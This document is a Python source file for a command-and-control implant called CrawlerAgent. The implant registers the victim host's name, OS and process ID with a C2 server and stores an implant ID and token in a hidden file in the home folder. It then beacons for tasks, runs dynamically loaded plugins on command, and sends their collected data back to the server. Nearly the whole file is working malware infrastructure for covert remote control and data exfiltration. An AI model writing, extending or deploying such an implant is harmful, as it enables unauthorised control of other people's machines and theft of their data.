import requests
import time
import os
import json
import platform
import threading
import importlib
import pkgutil
from typing import Dict, List, Type

from .plugins.base_plugin import BasePlugin

class CrawlerAgent:
    def __init__(self, c2_url="http://127.0.0.1:8000/api"):
        self.implant_id: str | None = None
        self.token: str | None = None
        self.running_plugins: Dict[str, BasePlugin] = {}
        self.loaded_plugins: Dict[str, BasePlugin] = {}
        self.C2_URL = c2_url
        self.BEACON_INTERVAL_SECONDS = 5  # Shorten for faster testing
        self.CONFIG_FILE_PATH = os.path.join(os.path.expanduser("~"), ".crawler_config.json")
        self.is_running = True # Flag for graceful shutdown

        self._load_config()
        self._load_plugins()

    def _load_config(self):
        if os.path.exists(self.CONFIG_FILE_PATH):
            try:
                with open(self.CONFIG_FILE_PATH, 'r') as f:
                    config = json.load(f)
                    self.implant_id = config.get('implant_id')
                    self.token = config.get('token')
            except (json.JSONDecodeError, IOError): pass

    def _save_config(self):
        config = {'implant_id': self.implant_id, 'token': self.token}
        with open(self.CONFIG_FILE_PATH, 'w') as f:
            json.dump(config, f)
        if platform.system() != "Windows":
            os.chmod(self.CONFIG_FILE_PATH, 0o600)

    def _register_with_c2(self) -> bool:
        payload = {"hostname": platform.node(), "os": f"{platform.system()} {platform.release()}", "pid": os.getpid()}
        try:
            response = requests.post(f"{self.C2_URL}/register", json=payload, timeout=10)
            response.raise_for_status()
            data = response.json()
            self.implant_id = data['implant_id']
            self.token = data['token']
            self._save_config()
            return True
        except requests.exceptions.RequestException:
            return False

    def _load_plugins(self):
        plugins_package = 'crawler.implant.plugins'
        plugins_path = os.path.join(os.path.dirname(__file__), "plugins")
        for _, name, _ in pkgutil.iter_modules([plugins_path]):
            if name != "base_plugin":
                try:
                    module = importlib.import_module(f"{plugins_package}.{name}")
                    for item_name in dir(module):
                        item = getattr(module, item_name)
                        if isinstance(item, type) and issubclass(item, BasePlugin) and item is not BasePlugin:
                            instance = item()
                            self.loaded_plugins[instance.get_name()] = instance
                except Exception: pass

    def _handle_task(self, task: Dict):
        command = task.get('command')
        args = task.get('args', {})
        plugin_name = args.get('plugin_name')

        if command == "start_plugin" and plugin_name in self.loaded_plugins and plugin_name not in self.running_plugins:
            plugin = self.loaded_plugins[plugin_name]
            self.running_plugins[plugin_name] = plugin
            thread = threading.Thread(target=plugin.start, args=(args,))
            thread.daemon = True
            thread.start()

        elif command == "stop_plugin" and plugin_name in self.running_plugins:
            self.running_plugins[plugin_name].stop()
            del self.running_plugins[plugin_name]

        elif command == "terminate":
            print("Test: Terminate command received by agent.")
            for plugin in self.running_plugins.values():
                plugin.stop()
            self.is_running = False # Set flag to false for graceful exit

    def run(self):
        if not self.implant_id or not self.token:
            if not self._register_with_c2():
                self.is_running = False
                return

        while self.is_running:
            try:
                headers = {"Authorization": f"Bearer {self.token}"}
                response = requests.get(f"{self.C2_URL}/tasks", headers=headers, timeout=5)

                if response.status_code == 401:
                    if not self._register_with_c2():
                        time.sleep(self.BEACON_INTERVAL_SECONDS * 2)
                        continue

                response.raise_for_status()
                tasks = response.json().get('tasks', [])
                for task in tasks:
                    self._handle_task(task)

                for name, instance in list(self.running_plugins.items()):
                    data = instance.get_data()
                    if data:
                        payload = {"plugin": name, "data": json.dumps(data)}
                        requests.post(f"{self.C2_URL}/data", json=payload, headers=headers, timeout=5)

            except requests.exceptions.RequestException:
                pass

            time.sleep(self.BEACON_INTERVAL_SECONDS)

if __name__ == "__main__":
    agent = CrawlerAgent()
    agent.run()
